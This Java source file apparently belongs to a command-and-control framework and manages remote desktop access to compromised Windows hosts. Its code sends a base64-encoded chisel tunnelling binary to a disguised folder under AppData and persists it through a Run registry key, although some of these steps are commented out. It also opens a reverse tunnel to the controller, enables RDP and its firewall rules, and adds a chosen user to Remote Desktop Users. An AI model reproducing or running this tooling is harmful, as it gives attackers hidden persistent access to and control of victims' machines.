package c2.rdp;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

import c2.Constants;
import c2.session.IOManager;
import c2.session.ServersideCommandPreprocessor;
import c2.win.WindowsCmdLineHelper;
import util.WindowsCommandIssuer;

public class WindowsRDPManager {

	private ChiselPortManager portMemoryManager = null;
	private Map<String, RDPSessionInfo> currentSessions = new HashMap<>();
	private IOManager io;

	private int portStart;
	private int numPorts;

	private Set<Integer> usedPorts = new HashSet<>();

	public static final String CLIENT_CHISEL_DIR;
	public static final String CHISEL_WIN_BIN;
	public static final String SERVER_IP;
	public static final String CHISEL_EXE;
	public static final String LOCAL_CHISEL_EXEC;

	public static final String PERSIST_REG_KEY;
	public static final String RDP_ENABLE_REG_KEY;

	// Holds onto references of started chisel listeners
	private Set<Process> processes = new HashSet<>();

	private ServersideCommandPreprocessor cmdPreprocessor;
	
	static {
		String defaultClientChiselDir = "%APPDATA%\\nw_helper";
		String defaultChiselWinBin = "clisel_win_64.exe";
		String defaultServerIp = "127.0.0.1";
		String defaultChiselExe = "chisel.exe";
		String defaultPersistRegKey = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		String defaultEnableRegKey = "\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"";
		String defaultLocalChiselExec = "C:\\Chisel\\clisel_win_64.exe";
		Path defaultConfig = Paths.get("config", "rdp.properties");
		try (InputStream input = new FileInputStream(defaultConfig.toFile())) {

			Properties prop = new Properties();

			// load a properties file
			prop.load(input);

			defaultClientChiselDir = prop.getProperty("client.chisel.dir");
			defaultChiselWinBin = prop.getProperty("client.win.bin");
			defaultServerIp = prop.getProperty("server.ip");
			defaultChiselExe = prop.getProperty("chisel.exe");
			defaultPersistRegKey = prop.getProperty("persist.reg.key");
			defaultEnableRegKey = prop.getProperty("rdp.enable.reg.key");
			defaultLocalChiselExec = prop.getProperty("local.chisel.exec");
		} catch (IOException ex) {
			System.out.println("Unable to load config file");
		}
		CLIENT_CHISEL_DIR = defaultClientChiselDir;
		CHISEL_WIN_BIN = defaultChiselWinBin;
		SERVER_IP = defaultServerIp;
		CHISEL_EXE = defaultChiselExe;
		PERSIST_REG_KEY = defaultPersistRegKey;
		RDP_ENABLE_REG_KEY = defaultEnableRegKey;
		LOCAL_CHISEL_EXEC = defaultLocalChiselExec;
	}

	public WindowsRDPManager(IOManager io, int portStart, int numPorts, ServersideCommandPreprocessor cmdPreprocessor) {
		this.io = io;
		this.portStart = portStart;
		this.numPorts = numPorts;
		this.cmdPreprocessor = cmdPreprocessor;
	}
	
	public void startup() throws Exception {
		portMemoryManager = ChiselPortManager.loadFromConfig(Paths.get("config", "rdp_persist"));
		for(RDPSessionInfo info : portMemoryManager.getInfo()) {
			startNewProxy(info, Integer.parseInt(info.sessionId));
			currentSessions.put(info.sessionId, info);
		}
	}
	
	public void teardown() {
		for(Process p : processes) {
			p.destroyForcibly();
		}
	}

	/*
	 * Remote desktop works as follows. Local to the C2 management daemon, the
	 * server will start an instance of chisel to receive incoming connections, and
	 * it will set it up to forward traffic from a local port to the incoming
	 * connection. On the client side, the existing daemon will be leveraged to
	 * first place an instance of chisel, and have it connect back home. The daemon
	 * will then conduct as series of setup verification actions, and complete steps
	 * as the are accomplished.
	 * 
	 * This function requires that elevated privileges are obtained, and if a setup
	 * step requiring elevated priviledges is required without the process running
	 * them, an error will return
	 */
	public RDPSessionInfo executeRDPSetup(String sessionId, String userForRDP) {
		int id = io.getSessionId(sessionId);
		StringBuilder reportGenerator = new StringBuilder();
		reportGenerator.append("Processing RDP instruction for session: " + sessionId + ":" + id);
		reportGenerator.append(System.lineSeparator());
		// Check if there's already an RDPSession with id
		RDPSessionInfo existingSession = currentSessions.get(userForRDP);
		if (existingSession != null) {
			// if so, validate from client that it is still active
			if (validateSessionReady(id, userForRDP, existingSession)) {
				// return existing RDP info
				return existingSession;
			}
		}

		// if not, set up
		int localListenRemoteForward;
		RDPSessionInfo info = null;
		if(existingSession == null) {
			try {
				localListenRemoteForward = getUnusedLocalPort();
				info = new RDPSessionInfo(sessionId, localListenRemoteForward, -1 );
				reportGenerator.append("Starting local listener - Remote forward: "+localListenRemoteForward);
				reportGenerator.append(System.lineSeparator());
				if(!startNewProxy(info, id)) {
					throw new Exception("Can't start proxy");
				}
			} catch (Exception ex) {
				ex.printStackTrace();
				info = new RDPSessionInfo(sessionId, -1, -1);
				info.addError(ex.getMessage());
				return info;
			}
		}else {
			reportGenerator.append("Using existing session");
			reportGenerator.append(System.lineSeparator());
			localListenRemoteForward = existingSession.localForwardPort;
		}
/*
		int localListenClientIncoming;
		int localListenRemoteForward;
		RDPSessionInfo info = null;
		// Check if server size chisel listener set up
		if (existingSession == null || !validateServersideChisel(existingSession)) {
			// if not, set up
			try {
				localListenClientIncoming = getUnusedLocalPort();
				localListenRemoteForward = getUnusedLocalPort();
				info = new RDPSessionInfo(sessionId, localListenRemoteForward, localListenClientIncoming);
				reportGenerator.append("Starting local listener - Local Incoming: " + localListenClientIncoming + " Remote forward: "+localListenRemoteForward);
				reportGenerator.append(System.lineSeparator());
				setupLocalChiselListener(info);
			} catch (Exception ex) {
				ex.printStackTrace();
				info = new RDPSessionInfo(sessionId, -1, -1);
				info.addError(ex.getMessage());
				return info;
			}
		} else {
			reportGenerator.append("Using existing session");
			reportGenerator.append(System.lineSeparator());
			localListenClientIncoming = existingSession.localClientIncomingPort;
			localListenRemoteForward = existingSession.localForwardPort;
		}
*/
		/*
		// check if chisel is on client
		reportGenerator.append("Validating client has chisel");
		reportGenerator.append(System.lineSeparator());
		boolean binaryDeployed = validateClientsideChiselBinaryDeployed(id, info);
		boolean regKeyDeployed = validateClientsideChiselRegistryDeployed(id, info);
		reportGenerator.append("Client binary in place? " + binaryDeployed);
		reportGenerator.append(System.lineSeparator());
		reportGenerator.append("Client regkey in place? " + regKeyDeployed);
		reportGenerator.append(System.lineSeparator());
		if (!(binaryDeployed && regKeyDeployed)) {
			try {
				reportGenerator.append("Installing chisel to client");
				reportGenerator.append(System.lineSeparator());
				installClientsideChisel(id, info, !binaryDeployed, !regKeyDeployed);
			} catch (Exception e) {
				info.addError(e.getMessage());
				return info;
			}
		}

		reportGenerator.append("Validating chisel running on client");
		reportGenerator.append(System.lineSeparator());
		// is chisel running on client?
		if (!validateClientsideChiselRunning(id, info)) {
			reportGenerator.append("Validation failed, starting chisel running on client");
			reportGenerator.append(System.lineSeparator());
			try {
				startClientChisel(info, sessionId);
			} catch (Exception e) {
				info.addError(e.getMessage());
				return info;
			}
		}
		*/
		

		reportGenerator.append("Testing if client is elevated");
		reportGenerator.append(System.lineSeparator());
		boolean isClientElevated = WindowsCmdLineHelper.isClientElevated(id, io);
		reportGenerator.append("Client elevated? " + isClientElevated);
		reportGenerator.append(System.lineSeparator());
		
		if (!validateClientRDPEnabled(id)) {
			// enable RDP
			if (!isClientElevated) {
				String msg = "I need elevate privileges to enable RDP:";
				info.addError(msg);
				return info;

			}
			try {
				reportGenerator.append("Enabling RDP");
				reportGenerator.append(System.lineSeparator());
				enableRDP(id);
			} catch (Exception e) {
				info.addError(e.getMessage());
				return info;
			}
		}

		if (!validateUserInRDPGroup(id, userForRDP)) {
			if (!isClientElevated) {

				String msg = "Require elevate privileges to add user " + userForRDP + " to 'Remote Desktop Users'";
				info.addError(msg);
				return info;

			}
			try {
				reportGenerator.append("Adding user: " +userForRDP + " to RDP.");
				reportGenerator.append(System.lineSeparator());
				addUserToRDPGroup(id, userForRDP);
			} catch (Exception e) {
				info.addError(e.getMessage());
				return info;
			}
		}

		portMemoryManager.addRDPSessionInfo(info);
		
		io.sendIO(id, reportGenerator.toString());
		return info;
	}
	
	public boolean startNewProxy(RDPSessionInfo info, int id) {
		String proxyStartCmd = "proxy 127.0.0.1 3389 " + info.localForwardPort;
		io.sendCommand(id, proxyStartCmd);
		String proxyStartCmdOut = io.awaitMultilineCommands(id);
		if(proxyStartCmdOut.contains("Proxy established")) {
			return true;
		}else {
			return false;
		}
	}

	public boolean validateSessionReady(int id, String userForRDP, RDPSessionInfo info) {
		/*
		return validateServersideChisel(info) && validateClientsideChiselBinaryDeployed(id, info) &&
				validateClientsideChiselRegistryDeployed(id, info)
				&& validateClientsideChiselRunning(id, info) && validateUserInRDPGroup(id, userForRDP);
				*/
		return validateUserInRDPGroup(id, userForRDP) && cmdPreprocessor.haveActiveForward(id, "127.0.0.1:3389") &&
				validateClientsideProxy(id);
	}
	
	public boolean validateClientsideProxy(int sessionId) {
		io.sendCommand(sessionId, "confirm_client_proxy 127.0.0.1:3389");
		String proxyResults = io.awaitMultilineCommands(sessionId);
		if(proxyResults.equals("yes")) {
			return true;
		}else {
			return false;
		}
	}

	public boolean validateServersideChisel(RDPSessionInfo info) {

		List<String> processes = WindowsCmdLineHelper.listRunningProcesses();
		for(String process : processes) {
			String targetArgs = "server -p " + info.localClientIncomingPort + " --reverse";
			if(process.contains("chisel") && process.contains(targetArgs)) {
				return true;
			}
		}
		return false;
	}

	public boolean setupLocalChiselListener(RDPSessionInfo info) throws Exception {
		// ./chisel server -p 8000 --reverse
		String cmd = LOCAL_CHISEL_EXEC + " server -p " + info.localClientIncomingPort + " --reverse";
		Process p = Runtime.getRuntime().exec(cmd);
		processes.add(p);
		return validateServersideChisel(info);
	}

	public boolean validateClientsideChiselBinaryDeployed(int id, RDPSessionInfo info) {
		// Check that the file is in the right spot
		io.sendCommand(id, "dir " + CLIENT_CHISEL_DIR + "\\" + CHISEL_EXE);
		String psOutput = io.awaitMultilineCommands(id);
		if (!psOutput.contains("Directory of") || !psOutput.contains(CHISEL_EXE)) {
			return false;
		}else {
			return true;
		}
	}
	public boolean validateClientsideChiselRegistryDeployed(int id, RDPSessionInfo info) {
		// Check autostart reg key
		String regQuery = "reg query " + PERSIST_REG_KEY;
		io.sendCommand(id, regQuery);
		String regQueryOut = io.awaitMultilineCommands(id);
		if (regQueryOut.contains(buildClientChiselExecArgs(info))) {
			return true;
		} else {
			return false;
		}
	}

	public void installClientsideChisel(int id, RDPSessionInfo info, boolean needBinary, boolean needRegKey) throws Exception {
		if(needBinary) {
			io.sendCommand(id, "mkdir " + CLIENT_CHISEL_DIR);
			byte[] fileBytes = Files.readAllBytes(Paths.get(CHISEL_WIN_BIN));
			byte[] encoded = Base64.getEncoder().encode(fileBytes);
			String encodedString = new String(encoded, StandardCharsets.US_ASCII);
			String command = "<control> download " + CLIENT_CHISEL_DIR + "\\" + CHISEL_EXE + "  " + encodedString;
			io.sendCommand(id, command);
		}
		String initialResponse = io.awaitMultilineCommands(id);
		if(needRegKey) {
			//Delete any prior startup keys
			io.sendCommand(id, "reg delete " + PERSIST_REG_KEY + " /v Chisel /f");
			String regAddCmd = buildRegkeyForAutostartChisel(info);
			io.sendCommand(id, regAddCmd);
		}
		String response = initialResponse + io.awaitMultilineCommands(id);
		for(int idx = 0; idx < 3; idx++) {
			if(needRegKey && !response.contains("The operation completed successfully.")) {
				response += io.awaitMultilineCommands(id);
			}else {
				break;
			}
		}
		
		if(response.contains("Access is denied.") ||
				response.contains("ERROR: Invalid syntax.")) {
			throw new Exception("Unable to install chisel client");
		}
	}

	private String buildRegkeyForAutostartChisel(RDPSessionInfo info) {

		return "reg add " + PERSIST_REG_KEY + " /v Chisel /t REG_SZ /d \"" + CLIENT_CHISEL_DIR + "\\" + CHISEL_EXE + " "
				+ buildClientChiselExecArgs(info) + "\"";
	}

	private String buildClientChiselExecArgs(RDPSessionInfo info) {
		//// ./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80
		return "client " + SERVER_IP + ":" + info.localClientIncomingPort + " R:" + info.localForwardPort
				+ ":127.0.0.1:3389";
	}

	private void startClientChisel(RDPSessionInfo info, String sessionId) throws Exception {
		int id = io.getSessionId(sessionId);
		//String command = "start /b cmd /c " + CLIENT_CHISEL_DIR + "\\" + CHISEL_EXE
		//		+ " " + buildClientChiselExecArgs(info);
		//This command launches chisel and then bricks the session wiht or without the /b flag
		String command = "<LAUNCH> start /b C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\nw_helper\\" + CHISEL_EXE
						+ " " + buildClientChiselExecArgs(info);
		io.sendCommand(id, command);
		String psOutput = io.awaitMultilineCommands(id);
		if(!psOutput.contains("Process launched")) {
			psOutput += io.awaitMultilineCommands(id);
		}
		if(!psOutput.contains("Process launched")) {
			throw new Exception("Unable to start local chisel");
		}
	}

	public boolean validateClientsideChiselRunning(int id, RDPSessionInfo info) {
		io.sendCommand(id, "powershell -c \"Get-WmiObject Win32_Process -Filter \"\"name = '" + CHISEL_EXE + "'\"\"\"");
		String psOutput = io.readAllMultilineCommands(id);
		if (psOutput.contains("chisel") && psOutput.contains("R:" + info.localForwardPort + ":127.0.0.1:3389")) {
			return true;
		} else {
			return false;
		}
	}

	public int getUnusedLocalPort() throws Exception {
		for (int mod = 0; mod < numPorts; mod++) {
			int candidatePort = portStart + mod;
			if (!usedPorts.contains(candidatePort)) {
				usedPorts.add(candidatePort);
				return candidatePort;
			}
		}
		throw new Exception("We're out of ports!");
	}

	

	public boolean validateClientRDPEnabled(int id) {
		// Check autostart reg key
		String regQuery = "reg query " + RDP_ENABLE_REG_KEY;
		io.sendCommand(id, regQuery);
		String regQueryOut = io.awaitMultilineCommands(id);
		String[] lines = regQueryOut.split(System.lineSeparator());
		for (String line : lines) {
			if (line.contains("fDenyTSConnections") && line.contains("0x0")) {
				return true;
			}
		}
		return false;
	}

	public boolean validateUserInRDPGroup(int id, String userForRDP) {
		io.sendCommand(id, "net localgroup \"Remote Desktop Users\"");
		String groupListing = io.awaitMultilineCommands(id);
		if (groupListing.contains(userForRDP)) {
			return true;
		} else {
			return false;
		}
	}

	public void addUserToRDPGroup(int sessionId, String userForRDP) throws Exception {
		String command = "net localgroup \"Remote Desktop Users\" " + userForRDP + " /add";
		String desc = "add user " + userForRDP + " to 'Remote Desktop Users'";
		WindowsCommandIssuer.commandIssuer(sessionId, io, command, desc, Constants.getConstants().getMaxResponseWait());
	}

	public void enableRDP(int sessionId) throws Exception {
		String command = "reg add " + RDP_ENABLE_REG_KEY + " /v fDenyTSConnections /t REG_DWORD /d 0 /f";
		String desc = "Enable Remote Desktop";
		WindowsCommandIssuer.commandIssuer(sessionId, io, command, desc, Constants.getConstants().getMaxResponseWait());
		// Note, I don't think I need a firewall check, but testing will show!
		io.sendCommand(sessionId, "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
		String firewallRuleOut = io.awaitMultilineCommands(sessionId);
		if(!firewallRuleOut.contains("Ok.")) {
			throw new Exception("Cannot enable firewall rules for RDP");
		}
	}
}
